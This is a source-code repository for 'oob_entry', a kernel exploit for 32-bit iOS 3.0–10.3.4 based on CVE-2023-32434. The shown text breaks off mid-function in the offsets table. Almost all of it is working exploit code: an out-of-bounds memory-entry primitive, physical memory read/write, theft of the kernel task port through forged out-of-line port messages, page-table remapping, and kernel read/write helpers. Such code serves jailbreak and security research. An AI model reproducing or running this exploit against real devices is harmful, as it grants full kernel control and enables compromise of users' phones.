Project Path: arc_staturnzz_oob_entry_cws75nvs

Source Tree:

```txt
arc_staturnzz_oob_entry_cws75nvs
├── LICENSE
├── README.md
├── include
│   ├── memory.h
│   ├── oob_entry.h
│   └── util.h
└── src
    ├── memory.c
    ├── oob_entry.c
    └── util.c

```

`LICENSE`:

```
MIT License

Copyright (c) 2025 staturnzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# oob_entry
tfp0 kernel exploit supporting every armv7 iOS version (iOS 3.0-10.3.4). 

The vulnerability used in this exploit is `CVE-2023-32434`. I will be releasing a write up in the coming weeks about this exploit and methods used.


```

`include/memory.h`:

```h
#ifndef memory_h
#define memory_h

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

#define mem_barrier() {asm volatile ("dmb sy");}
#define mem_sync() {asm volatile ("dsb sy");}

extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_copy(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t);
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);

uint8_t *map_data(uint32_t pa, uint32_t size, vm_prot_t prot);
uint8_t *map_relative_data(uint32_t offset, uint32_t size, vm_prot_t prot);
void unmap_data(uint8_t *addr, uint32_t size);
void physread_buf(uint32_t addr, void *data, uint32_t size);
void physwrite_buf(uint32_t addr, void *data, uint32_t size);
uint32_t physread32(uint32_t addr);
void physwrite32(uint32_t addr, uint32_t data);
void kread_buf(uint32_t addr, void *data, uint32_t size);
void kwrite_buf(uint32_t addr, void *data, uint32_t size);
void kwrite_buf_exec(uint32_t addr, void *data, uint32_t size);
uint32_t kread32(uint32_t addr);
uint16_t kread16(uint32_t addr);
uint8_t kread8(uint32_t addr);
void kwrite32(uint32_t addr, uint32_t data);
void kwrite16(uint32_t addr, uint16_t data);
void kwrite8(uint32_t addr, uint8_t data);
void kwrite32_exec(uint32_t addr, uint32_t data);
void kwrite16_exec(uint32_t addr, uint16_t data);
void kwrite8_exec(uint32_t addr, uint8_t data);
uint32_t kalloc(size_t size);
void kfree(uint32_t addr, size_t size);
uint32_t kvtophys(uint32_t va);

#endif /* memory_h */

```

`include/oob_entry.h`:

```h
#ifndef oob_entry_h
#define oob_entry_h

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <mach/task.h>
#include <mach/mach_init.h>
#include <sys/resource.h>

typedef struct {
    uint32_t self_port_addr;
    uint32_t self_proc_addr;
    uint32_t self_task_addr;
    uint32_t kern_port_addr;
    uint32_t kern_proc_addr;
    uint32_t kern_task_addr;
    uint32_t kern_tte_phys;
    uint32_t host_port_addr;
    uint32_t kernel_slide;
    uint32_t kernel_base;
    uint32_t kernel_static_base;
    uint32_t kernel_phys_base;
    mach_port_t main_entry;
    mach_port_t oob_entry;
    uint32_t mapping_base;
    uint32_t mem_base;
    uint32_t mem_size;
    uint32_t addr_mask;
    mach_port_t tfp0;
    uint32_t version[3];
    struct {
        struct {
            int ref_count;
            int bsd_info;
        } task;        
        struct {
            int ip_references;
            int ip_kobject;
            int size;
        } ipc_port;
    } offsets;
} kinfo_t;

extern kinfo_t *kinfo;

int run_exploit(void);

#endif /* oob_entry_h */

```

`include/util.h`:

```h
#ifndef util_h
#define util_h

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <sys/syslog.h>
#include <sys/sysctl.h>

#define IKOT_TASK           0x00000002
#define	IKOT_HOST           0x00000003
#define	IKOT_HOST_PRIV      0x00000004
#define IO_BITS_ACTIVE      0x80000000
#define OOL_COUNT           5

#define koffsetof(struct, entry) kinfo->offsets.struct.entry

typedef struct {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
} ool_msg_t;

extern CFDictionaryRef _CFCopySystemVersionDictionary(void);
extern void *(*IOSurfaceCreate)(CFDictionaryRef);
extern void *(*IOSurfaceGetBaseAddress)(void *);
extern int (*IOServiceOpen)(mach_port_t, mach_port_t, uint32_t, mach_port_t *);
extern CFMutableDictionaryRef (*IOServiceMatching)(const char *);
extern mach_port_t (*IOServiceGetMatchingService)(mach_port_t, CFDictionaryRef);
extern int (*IOMobileFramebufferOpen)(mach_port_t, mach_port_t, uint32_t, void *);
extern int (*IOMobileFramebufferGetLayerDefaultSurface)(mach_port_t, int, void *);

void print_log(const char *fmt, ...);
int init_io(void);
void get_ios_version(uint32_t *output);
CFNumberRef CFNUM(uint32_t value);
mach_port_t create_mach_port(void);
bool valid_ipc_port(uint32_t addr);
uint64_t timer_start(void);
uint64_t timer_end(uint64_t start);
int init_offsets(void);

#endif /* util_h */

```

`src/memory.c`:

```c
#include "oob_entry.h"
#include "util.h"
#include "memory.h"

uint8_t *map_data(uint32_t pa, uint32_t size, vm_prot_t prot) {
    uint32_t map_offset = (pa & ~0xfff) - kinfo->mapping_base;
    mach_vm_address_t mapped = 0;
    if (mach_vm_map(mach_task_self(), &mapped, size, 0, 1, kinfo->oob_entry, map_offset, 0, prot, prot, 0) != 0) return NULL;
    mem_sync();
    return (uint8_t *)mapped;;
}

uint8_t *map_relative_data(uint32_t offset, uint32_t size, vm_prot_t prot) {
    mach_vm_address_t mapped = 0;
    if (mach_vm_map(mach_task_self(), &mapped, size, 0, 1, kinfo->oob_entry, offset, 0, prot, prot, 0) != 0) return NULL;
    mem_sync();
    return (uint8_t *)mapped;
}

void unmap_data(uint8_t *addr, uint32_t size) {
    if (addr == NULL) return;
    mem_barrier();
    mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)addr, size);
}

void physread_buf(uint32_t addr, void *data, uint32_t size) {
    uint32_t read_offset = addr & 0xfff;
    uint32_t map_size = (size + 0xfff) & ~0xfff;

    uint8_t *mapped = map_data((addr & ~0xfff), map_size, VM_PROT_READ);
    uint8_t *dest = (uint8_t *)data;
    uint8_t *src = (uint8_t *)(mapped + read_offset);

    while (size--) *dest++ = *src++;
    unmap_data(mapped, map_size);
}

void physwrite_buf(uint32_t addr, void *data, uint32_t size) {
    uint32_t write_offset = addr & 0xfff;
    uint32_t map_size = (size + 0xfff) & ~0xfff;

    uint8_t *mapped = map_data((addr & ~0xfff), map_size, VM_PROT_READ | VM_PROT_WRITE);
    uint8_t *dest = (uint8_t *)(mapped + write_offset);
    uint8_t *src = (uint8_t *)data;
    
    while (size--) *dest++ = *src++;
    unmap_data(mapped, map_size);
}

uint32_t physread32(uint32_t addr) {
    uint32_t value = 0;
    physread_buf(addr, &value, 0x4);
    return value;
}

void physwrite32(uint32_t addr, uint32_t data) {
    physwrite_buf(addr, &data, 0x4);
}

uint32_t kvtophys(uint32_t va) {
    if (kinfo->version[0] <= 5) {
        return va - (kinfo->kernel_static_base - kinfo->kernel_phys_base);
    } else if (kinfo->version[0] <= 9) {
        return va - kinfo->kernel_slide;
    }
    
    if (kinfo->kern_tte_phys == 0) {
        uint8_t *mapped = map_data(kinfo->mem_base, 0x1000000, VM_PROT_READ);
        for (uint32_t i = 0; i < 0x1000000-0x1000; i+=0x4) {
            uint32_t *data = (uint32_t *)(mapped + i);
            if (data[0] == PAGE_SIZE && data[1] == PAGE_MASK && data[2] == PAGE_SHIFT) {
                for (uint32_t j = 0; j < 0x100; j++) {
                    if ((data[j] & 0x80000000) == 0x80000000 && data[j] != data[j+1] &&
                        (data[j] & 0xffff) == (data[j+1] & 0xffff)) {
                        kinfo->kern_tte_phys = data[j+1];
                        break;
                    }
                }
            }
            if (kinfo->kern_tte_phys != 0) break;
        }

        unmap_data(mapped, 0x1000000);
        if (kinfo->kern_tte_phys == 0) return 0;
    }
    
    uint32_t l1_index = va >> 20;
    uint32_t l1_desc_addr = kinfo->kern_tte_phys + (l1_index * 4);
    uint32_t l1_desc = physread32(l1_desc_addr);

    if ((l1_desc & 0x3) == 0x2) {
        return (l1_desc & 0xFFF00000) + (va & 0x000FFFFF);
    } else if ((l1_desc & 0x3) == 0x1) {
        uint32_t l2_index = (va >> 12) & 0xFF;
        uint32_t l2_desc_addr = (l1_desc & 0xFFFFFC00) + (l2_index * 4);
        uint32_t l2_desc = physread32(l2_desc_addr);

        if ((l2_desc & 0x3) == 0x2) {
            return (l2_desc & 0xFFFF0000) + (va & 0xFFFF);
        } else if ((l2_desc & 0x3) == 0x1 || (l2_desc & 0x3) == 0x3) {
            return (l2_desc & 0xFFFFF000) + (va & 0xFFF);
        }
    }
    return 0;
}

void kread_buf(uint32_t addr, void *data, uint32_t size) {
    uint32_t offset = 0;
    while (offset < size) {
        mach_vm_size_t read_size = 2048;
        mach_vm_size_t out_size = 0;

        if (read_size > size - offset) read_size = size - offset;
        mach_vm_read_overwrite(kinfo->tfp0, addr + offset, read_size, (mach_vm_address_t)data + offset, &out_size);
        if (out_size == 0) break;
        offset += out_size;
    }
}

void kwrite_buf(uint32_t addr, void *data, uint32_t size) {
    uint32_t offset = 0;
    while (offset < size) {
        mach_msg_type_number_t write_size = 2048;
        if (write_size > size - offset) write_size = size - offset;
        if (mach_vm_write(kinfo->tfp0, addr + offset, (uint32_t)data + offset, write_size) != 0) break;
        offset += write_size;
    }
}

void kwrite_buf_exec(uint32_t addr, void *data, uint32_t size) {
    uint32_t pa = kvtophys(addr);
    if (pa == 0) return;
    return physwrite_buf(pa, data, size);
}

uint32_t kread32(uint32_t addr) {
    uint32_t value = 0;
    kread_buf(addr, &value, 0x4);
    return value;
}

uint16_t kread16(uint32_t addr) {
    uint16_t value = 0;
    kread_buf(addr, &value, 0x2);
    return value;
}

uint8_t kread8(uint32_t addr) {
    uint8_t value = 0;
    kread_buf(addr, &value, 0x1);
    return value;
}

void kwrite32(uint32_t addr, uint32_t data) {
    kwrite_buf(addr, &data, 0x4);
}

void kwrite16(uint32_t addr, uint16_t data) {
    kwrite_buf(addr, &data, 0x2);
}

void kwrite8(uint32_t addr, uint8_t data) {
    kwrite_buf(addr, &data, 0x1);
}

void kwrite32_exec(uint32_t addr, uint32_t data) {
    kwrite_buf_exec(addr, &data, 0x4);
}

void kwrite16_exec(uint32_t addr, uint16_t data) {
    kwrite_buf_exec(addr, &data, 0x2);
}

void kwrite8_exec(uint32_t addr, uint8_t data) {
    kwrite_buf_exec(addr, &data, 0x1);
}

uint32_t kalloc(size_t size) {
    mach_vm_address_t addr = 0;
    if (mach_vm_allocate(kinfo->tfp0, &addr, size, VM_FLAGS_ANYWHERE) != 0) return 0;
    return (uint32_t)addr;
}

void kfree(uint32_t addr, size_t size) {
    mach_vm_deallocate(kinfo->tfp0, (mach_vm_address_t)addr, size);
}

```

`src/oob_entry.c`:

```c
#include "util.h"
#include "memory.h"
#include "oob_entry.h"

kinfo_t *kinfo = NULL;

int create_oob_entry(void) {
    uint64_t oob_size = 0xffffffffffffc000;
    uint64_t oob_offset = 0xffffffff00008000;
    vm_prot_t prot = VM_PROT_READ | VM_PROT_WRITE;
    mach_port_t task = mach_task_self();
    void *surface = NULL;
    
    if (kinfo->version[0] <= 7) {
        const char *list[] = {"AppleCLCD", "AppleM2CLCD", "AppleH1CLCD", "AppleMobileCLCD", NULL};
        mach_port_t service = MACH_PORT_NULL;
        mach_port_t client = MACH_PORT_NULL;

        for (uint32_t i = 0; list[i]; i++) {
            service = IOServiceGetMatchingService(0, IOServiceMatching(list[i]));
            if (MACH_PORT_VALID(service)) break;
        }

        if (!MACH_PORT_VALID(service)) return -1;
        IOMobileFramebufferOpen(service, mach_task_self(), 0, &client);

        if (!MACH_PORT_VALID(client)) return -1;
        IOMobileFramebufferGetLayerDefaultSurface(client, 0, &surface);
        if (surface == NULL) return -1;
    } else {
        CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
        CFDictionarySetValue(dict, CFSTR("IOSurfacePixelFormat"), CFNUM((int)'ARGB'));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceWidth"), CFNUM(32));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceHeight"), CFNUM(32));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBufferTileMode"), kCFBooleanFalse);
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerRow"), CFNUM(128));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerElement"), CFNUM(4));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), CFNUM(0x20000));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
        
        surface = IOSurfaceCreate(dict);
        CFRelease(dict);
        if (surface == NULL) return -1;
    }
    
    memory_object_size_t entry_size = 0x20000;
    memory_object_offset_t entry_base = (memory_object_offset_t)IOSurfaceGetBaseAddress(surface);
    if (kinfo->version[0] >= 8) memset((void *)entry_base, 0x41, entry_size);

    if (mach_make_memory_entry_64(task, &entry_size, entry_base, prot, &kinfo->main_entry, 0) != 0) return -1;      
    if (mach_make_memory_entry_64(task, &oob_size, oob_offset, prot, &kinfo->oob_entry, kinfo->main_entry) != 0) return -1;
    CFRelease(surface);
    return 0;
}

int create_ool_helper(mach_port_t *port, uint32_t *addr) {
    mach_port_t remote = create_mach_port();
    mach_port_t task = mach_task_self();
    mach_port_t host = mach_host_self();

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = OOL_COUNT;
    mach_port_set_attributes(task, remote, 1, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);

    mach_port_t *port_list = calloc(1, 1024 * 0x4);
    for (uint32_t i = 0; i < 1024; i++) port_list[i] = MACH_PORT_DEAD;
    port_list[1] = MACH_PORT_NULL;
    port_list[8] = MACH_PORT_NULL;
    port_list[3] = task;
    port_list[4] = host;
    port_list[5] = task;
    port_list[6] = host;

    ool_msg_t *msg = calloc(1, sizeof(ool_msg_t));
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(ool_msg_t);
    msg->hdr.msgh_remote_port = remote;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x13374141;
    msg->body.msgh_descriptor_count = 1;
    msg->ool_ports.address = port_list;
    msg->ool_ports.count = 1024;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    for (uint32_t i = 0; i < OOL_COUNT; i++) {
        mach_msg(&msg->hdr, MACH_SEND_MSG, msg->hdr.msgh_size, 0, 0, 0, 0);
    }
    
    uint32_t map_current = kinfo->mem_base;
    uint32_t map_end = map_current + kinfo->mem_size;
    uint32_t map_size = kinfo->mem_size / 0x100;
    uint8_t *mapped = NULL;
    free(msg);

    for (; map_current < map_end; map_current+=map_size) {
        mapped = map_data(map_current, map_size, VM_PROT_READ);
        if (mapped == NULL) break;
        
        for (uint32_t i = 0x0; i < map_size; i+=0x1000) {
            uint32_t *ports = (uint32_t *)(mapped + i);
            if (ports[0] == -1 && ports[1] == 0 && ports[2] == -1 &&
                ports[7] == -1 && ports[8] == 0 && ports[9] == -1 &&
                ports[3] == ports[5] && ports[4] == ports[6] && ports[3] != ports[4]) {
                
                *addr = map_current + i;
                *port = remote;
                break;
            }
        }
        
        unmap_data(mapped, map_size);
        if (*addr != 0) break;
    }

    if (*addr == 0) mach_port_deallocate(task, remote);
    return (*addr != 0) ? 0 : -1;
}

int find_kernel_port(void) {
    uint32_t page_va = kinfo->host_port_addr & ~0xfff;
    uint32_t page_pa = kvtophys(page_va);
    if (page_va == 0) return -1;

    uint8_t *mapped = map_data(page_pa, 0x1000, VM_PROT_READ);
    uint32_t task_bits = IO_BITS_ACTIVE | IKOT_TASK;
    uint32_t offset = (kinfo->version[0] <= 8) ? 0x1c : 0x2c;
     
    for (uint32_t i = 0; i < 0x1000; i+=0x4) {
        if (*(uint32_t *)(mapped + i) == task_bits && (*(uint32_t *)(mapped + i + offset) & ~0xfff) == page_va) {
            if (kinfo->version[0] >= 4) {
                kinfo->kern_port_addr = (kinfo->host_port_addr & ~0xfff) + i;
                kinfo->kern_task_addr = *(uint32_t *)(mapped + i + koffsetof(ipc_port, ip_kobject));
            } else {
                kinfo->kern_port_addr = (kinfo->host_port_addr & ~0xfff) + i - 0x4;
                kinfo->kern_task_addr = *(uint32_t *)(mapped + i - 0x4 + koffsetof(ipc_port, ip_kobject));
            }
            break;
        }
    }

    unmap_data(mapped, 0x1000);
    return (kinfo->kern_port_addr != 0) ? 0 : -1;
}

int remap_kernel_task(void) {
    uint32_t kern_task_pa = kvtophys(kinfo->kern_task_addr);
    uint32_t kern_port_pa = kvtophys(kinfo->kern_port_addr);
    if (kern_task_pa == 0 || kern_port_pa == 0) return -1;

    uint32_t remap_entry = kinfo->mapping_base + 0x40000;
    uint32_t remap_page_pa = kern_task_pa & ~0xfff;
    uint32_t remap_page_va = 0xdead0000;
    uint32_t remap_va = 0xdead0000 + (kinfo->kern_task_addr & 0xfff);

    uint32_t l1_index = (remap_page_va >> 20) & 0xfff;
    uint32_t l1_entry = kinfo->kern_tte_phys + (l1_index * 4);
    uint32_t l2_index = (remap_page_va >> 12) & 0xff;
    uint32_t l2_entry = remap_entry + (l2_index * 4);

    physwrite32(l2_entry, (remap_page_pa & 0xfffff000) | (3 << 4) | 0x2);
    physwrite32(l1_entry, (remap_entry & 0xfffffc00) | 0x1);
    physwrite32(kern_port_pa + koffsetof(ipc_port, ip_kobject), remap_va);

    mem_barrier();
    return 0;
}

int run_exploit(void) {
    uint64_t timer = timer_start();
    kinfo = calloc(1, sizeof(kinfo_t));
    int status = -1;

    struct rlimit rlim = {0};
    rlim.rlim_cur = RLIM_INFINITY;
    rlim.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_AS, &rlim);
    setrlimit(RLIMIT_DATA, &rlim);

    if (init_io() != 0) goto done;
    if (init_offsets() != 0) goto done;
    print_log("[*] version: %u.%u.%u\n", kinfo->version[0], kinfo->version[1], kinfo->version[2]);
    
    if (create_oob_entry() != 0) goto done;
    print_log("[*] main_entry: 0x%x\n", kinfo->main_entry);
    print_log("[*] oob_entry: 0x%x\n", kinfo->oob_entry);

    uint8_t *mapped = map_relative_data(0, 0x1000000, VM_PROT_READ);
    for (uint32_t i = 0; i < 0x1000000; i+=0x1000) {
        if (*(uint32_t *)(mapped + i) == MH_MAGIC && *(uint32_t *)(mapped + i + 0xc) == MH_EXECUTE) {
            kinfo->mapping_base = kinfo->kernel_phys_base - i;
            kinfo->kernel_base = *(uint32_t *)(mapped + i + 0x34);
            if (kinfo->version[0] >= 6) {
                kinfo->kernel_slide = kinfo->kernel_base - kinfo->kernel_phys_base;
            }
            break;
        }
    }

    unmap_data(mapped, 0x1000000);
    if (kinfo->mapping_base == 0) goto done;
    print_log("[*] mapping_base: 0x%x\n", kinfo->mapping_base);
    print_log("[*] kernel_base: 0x%x\n", kinfo->kernel_base);
    print_log("[*] kernel_slide: 0x%x\n", kinfo->kernel_slide);

    mach_port_t ool_port = MACH_PORT_NULL;
    uint32_t ool_addr = 0;
    if (create_ool_helper(&ool_port, &ool_addr) != 0) goto done;
    print_log("[*] ool_port: 0x%x\n", ool_port);
    print_log("[*] ool_addr: 0x%x\n", ool_addr);
    
    kinfo->self_port_addr = physread32(ool_addr + 0xc);
    kinfo->host_port_addr = physread32(ool_addr + 0x10);
    print_log("[*] self_port_addr: 0x%x\n", kinfo->self_port_addr);
    print_log("[*] host_port_addr: 0x%x\n", kinfo->host_port_addr);

    if (find_kernel_port() != 0) goto done;
    if (kinfo->version[0] == 10 && kinfo->version[1] == 3) {
        if (remap_kernel_task() != 0) goto done;
    }

    print_log("[*] kern_port_addr: 0x%x\n", kinfo->kern_port_addr);
    physwrite32(ool_addr + 0xc, kinfo->kern_port_addr);
    usleep(10000);

    ool_msg_t *msg = calloc(1, 0x1000);
    for (uint32_t i = 0; i < OOL_COUNT; i++) {
         bzero(msg, 0x1000);
         mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, ool_port, 0, 0);

         mach_port_t *received = msg->ool_ports.address;
         if (received != NULL && received[3] != mach_task_self()) {
             kinfo->tfp0 = received[3];
             break;
         }
     }

    mach_port_deallocate(mach_task_self(), ool_port);
    free(msg);
    if (!MACH_PORT_VALID(kinfo->tfp0)) goto done;

    if (kinfo->version[0] >= 5) {
        natural_t type = 0;
        mach_vm_address_t addr = 0;
        pid_t pid = -1;

        mach_port_kobject(mach_task_self(), kinfo->tfp0, &type, &addr);
        pid_for_task(kinfo->tfp0, &pid);
        if (type != IKOT_TASK || pid != 0) goto done;
    }

    print_log("[*] tfp0: 0x%x\n", kinfo->tfp0);
    uint32_t test_alloc = kalloc(0x1000);
    print_log("[*] test_alloc: 0x%x\n", test_alloc);
    if (test_alloc == 0) goto done;
    
    kwrite32(test_alloc, 0x41414141);
    uint32_t test_read = kread32(test_alloc);
    print_log("[*] test_read: 0x%x\n", test_read);
    if (test_read != 0x41414141) goto done;
    
    if (kinfo->kern_task_addr == 0) kinfo->kern_task_addr = kread32(kinfo->kern_port_addr + koffsetof(ipc_port, ip_kobject));
    kinfo->kern_proc_addr = kread32(kinfo->kern_task_addr + koffsetof(task, bsd_info));
    kinfo->self_task_addr = kread32(kinfo->self_port_addr + koffsetof(ipc_port, ip_kobject));
    kinfo->self_proc_addr = kread32(kinfo->self_task_addr + koffsetof(task, bsd_info));

    print_log("[*] kern_task_addr: 0x%x\n", kinfo->kern_task_addr);
    print_log("[*] kern_proc_addr: 0x%x\n", kinfo->kern_proc_addr);
    print_log("[*] self_task_addr: 0x%x\n", kinfo->self_task_addr);
    print_log("[*] self_proc_addr: 0x%x\n", kinfo->self_port_addr);
    print_log("[*] kern_port_addr: 0x%x\n", kinfo->kern_port_addr);

    kwrite32(kinfo->kern_port_addr + koffsetof(ipc_port, ip_references), 0x414141);
    kwrite32(kinfo->kern_task_addr + koffsetof(task, ref_count), 0x424242);
    print_log("[*] done in %llu ms\n", timer_end(timer));
    status = 0;

done:
    if (status == 0) return 0;
    if (kinfo != NULL) {
        if (MACH_PORT_VALID(kinfo->oob_entry)) mach_port_deallocate(mach_task_self(), kinfo->oob_entry);
        if (MACH_PORT_VALID(kinfo->main_entry)) mach_port_deallocate(mach_task_self(), kinfo->main_entry);
        if (MACH_PORT_VALID(kinfo->tfp0)) mach_port_deallocate(mach_task_self(), kinfo->tfp0);
        free(kinfo);
        kinfo = NULL;
    }
    
    print_log("[-] exploit failed\n");
    return -1;
}

```

`src/util.c`:

```c
#include "oob_entry.h"
#include "util.h"

void *(*IOSurfaceCreate)(CFDictionaryRef) = NULL;
void *(*IOSurfaceGetBaseAddress)(void *) = NULL;
int (*IOServiceOpen)(mach_port_t, mach_port_t, uint32_t, mach_port_t *) = NULL;
CFMutableDictionaryRef (*IOServiceMatching)(const char *) = NULL;
mach_port_t (*IOServiceGetMatchingService)(mach_port_t, CFDictionaryRef) = NULL;
int (*IOMobileFramebufferOpen)(mach_port_t, mach_port_t, uint32_t, void *) = NULL;
int (*IOMobileFramebufferGetLayerDefaultSurface)(mach_port_t, int, void *) = NULL;

void print_log(const char *fmt, ...) {
    static bool log_opened;
    if (!log_opened) {
        openlog("oob_entry", LOG_PID | LOG_CONS, LOG_USER);
        log_opened = true;
    }
    
    va_list va;
    va_start(va, fmt);
    vsyslog(LOG_ERR, fmt, va);
    vfprintf(stderr, fmt, va);
    va_end(va);
}

int init_io(void) {
    void *io_handle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (io_handle == NULL) {
        io_handle = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
        if (io_handle == NULL) return -1;
    }

    if ((IOSurfaceCreate = dlsym(io_handle, "IOSurfaceCreate")) == NULL) return -1;
    if ((IOSurfaceGetBaseAddress = dlsym(io_handle, "IOSurfaceGetBaseAddress")) == NULL) return -1;
    if ((IOServiceGetMatchingService = dlsym(io_handle, "IOServiceGetMatchingService")) == NULL) return -1;
    if ((IOServiceMatching = dlsym(io_handle, "IOServiceMatching")) == NULL) return -1;
    if ((IOServiceOpen = dlsym(io_handle, "IOServiceOpen")) == NULL) return -1;

    void *fb_handle = dlopen("/System/Library/Frameworks/IOMobileFramebuffer.framework/IOMobileFramebuffer", RTLD_NOW);
    if (fb_handle == NULL) {
        fb_handle = dlopen("/System/Library/PrivateFrameworks/IOMobileFramebuffer.framework/IOMobileFramebuffer", RTLD_NOW);
        if (fb_handle == NULL) return -1;
    }

    if ((IOMobileFramebufferOpen = dlsym(fb_handle, "IOMobileFramebufferOpen")) == NULL) return -1;
    if ((IOMobileFramebufferGetLayerDefaultSurface = dlsym(fb_handle, "IOMobileFramebufferGetLayerDefaultSurface")) == NULL) return -1;
    return 0;
}

void get_ios_version(uint32_t *output) {
    char str[32] = {0};
    CFDictionaryRef dict = _CFCopySystemVersionDictionary();
    CFStringRef version = CFDictionaryGetValue(dict, CFSTR("ProductVersion"));
    CFStringGetCString(version, str, 32, kCFStringEncodingUTF8);
    
    sscanf(str, "%d.%d.%d", &output[0], &output[1], &output[2]);
    CFRelease(dict);
}

CFNumberRef CFNUM(uint32_t value) {
    return CFNumberCreate(NULL, kCFNumberIntType, (void *)&value);
}

mach_port_t create_mach_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    mach_port_t task = mach_task_self();
    mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(task, port, port, MACH_MSG_TYPE_MAKE_SEND);
    return port;
}

bool valid_ipc_port(uint32_t addr) {
    if ((addr & 0x80000000) != 0x80000000 || (addr % 4) != 0) return false;
    return !(addr == 0xff000000 || addr == 0xffff0000 || addr == 0xdeadbeef);
}

uint64_t timer_start(void) {
    return mach_absolute_time();
}

uint64_t timer_end(uint64_t start) {
    uint64_t end = mach_absolute_time();
    mach_timebase_info_data_t info = {0};
    mach_timebase_info(&info);
    return (uint64_t)(((double)(end - start) * info.numer / info.denom) / 1000000);
}

int init_offsets(void) {
    get_ios_version(kinfo->version);
    if (kinfo->version[0] < 3 || kinfo->version[0] > 10) return -1;
    
    size_t size = sizeof(kinfo->mem_size);
    sysctlbyname("hw.physmem", &kinfo->mem_size, &size, NULL, 0);
    kinfo->mem_size &= 0xfff00000;

    switch (kinfo->version[0]) {
        case 10:
            kinfo->offsets.task.ref_count = 0x8;
            kinfo->offsets.task.bsd_info = 0x22c;
            kinfo->offsets.ipc_port.ip_references = 0x4;
            kinfo->offsets.ipc_port.ip_kobject = 0x48;
            kinfo->offsets.ipc_port.size = 0x74;
            kinfo->kernel_static_base = 0x80001000;
            kinfo->kernel_phys_base = 0x80001000;
            kinfo->mem_base = 0x80000000;
            break;
        case 9:
            kinfo->offsets.task.ref_count = 0xc;
            kinfo->offsets.task.bsd_info = 0x200;
            kinfo->offsets.ipc_port.ip_references = 0x4;
            kinfo->offsets.ipc_port.ip_kobject = 0x50;
            kinfo->offsets.ipc_port.size = 0x78;
            kinfo->kernel_static_base = 0x80001000;
            kinfo->kernel_phys_base = 0x80001000;
            kinfo->mem_base = 0x80000000;
            break;
        case 8:
            kinfo->offsets.task.ref_count = 0xc;
            kinfo->offsets.task.bsd_info = 0x1f0;
            kinfo->offsets.ipc_port.ip_references = 0x4;
            kinfo->offsets.ipc_port.ip_kobject = 0x44;
            kinfo->offsets.ipc_port.size = 0x70;
            kinfo->kernel_static_base = 0x80001000;
            kinfo->kernel_phys_base = 0x80001000;
            kinfo->mem_base = 0x80000000;
            break;
        case 7:
            kinfo->offsets.task.ref_count = 0xc;
            kinfo->offsets.task.bsd_info = 0x1e8;
            kinfo->offsets.ipc_port.ip_references = 0x4;
            kinfo->offsets.ipc_port.ip_kobject = 0x44;
            kinfo->offsets.ipc_port.size = 0x70;
            kinfo->kernel_static_base = 0x80001000;
